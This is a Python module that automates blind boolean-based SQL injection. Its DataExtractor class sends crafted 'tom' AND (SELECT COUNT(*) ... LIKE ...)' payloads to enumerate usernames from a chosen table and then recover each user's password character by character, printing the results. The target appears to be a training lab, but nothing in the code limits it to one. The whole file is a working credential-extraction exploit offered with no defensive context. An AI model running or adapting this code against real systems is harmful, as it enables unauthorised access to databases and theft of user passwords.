from typing import List, Optional
from .base_injector import BaseInjector
from .config import Config

class DataExtractor(BaseInjector):
    def __init__(self, config: Config):
        super().__init__(config)
        
    def extract_usernames(self, table_name: str, username_column: str) -> List[str]:
        """Extract all usernames from a specific table and column."""
        usernames = []
        current_index = 0
        
        while current_index < len(self.alphabet):
            def check_username_prefix(prefix: str) -> bool:
                payload = f"tom' AND (SELECT COUNT(*) FROM {table_name} WHERE {username_column} LIKE '{prefix}%') > 0 -- "
                return self._make_request(payload)
                
            # Try to find a username starting with the current letter
            username = None
            for char in self.alphabet[current_index:]:
                if check_username_prefix(char):
                    # Found a username starting with this character, now get the full name
                    username = self._enumerate_string(check_username_prefix, chars=self.extended_chars, prefix=char)
                    if username:
                        usernames.append(username)
                        print(f"Found username: {username}")
                        current_index = self.alphabet.index(username[0]) + 1
                        break
                        
            if not username:
                # No more usernames found starting with remaining letters
                break
                
        return usernames
        
    def extract_password(self, table_name: str, username: str, password_column: str) -> Optional[str]:
        """Extract password for a specific username from a table."""
        def check_password_prefix(prefix: str) -> bool:
            payload = f"tom' AND (SELECT COUNT(*) FROM {table_name} WHERE USERID = '{username}' AND {password_column} LIKE '{prefix}%') > 0 -- "
            return self._make_request(payload)
            
        password = self._enumerate_string(check_password_prefix, chars=self.extended_chars)
        if password:
            print(f"Found password for {username}: {password}")
        return password
